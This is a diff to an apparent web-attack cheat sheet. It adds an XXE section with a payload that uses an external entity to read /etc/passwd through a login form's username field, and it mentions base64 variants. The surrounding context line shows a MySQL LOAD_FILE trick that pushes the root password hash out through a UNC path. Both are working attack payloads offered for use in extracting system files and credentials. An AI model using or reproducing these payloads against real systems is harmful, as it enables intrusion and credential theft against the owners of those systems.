@@ -306,4 +306,17 @@ SELECT LOAD_FILE(CONCAT('\\\\', 'SELECT password FROM mysql.users WHERE user=\'r
 * Use HEX conversion 
 
 ## XXE
-coming soon
+List of common attack vectors in order to extract juicy information
+
+**Basic payload structure**
+Other variants could be:
+* base64 encoding of the username
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]> 
+    <login>
+      <username>&ext;</username>
+      <password>BBBB</password>
+    </login>
+```
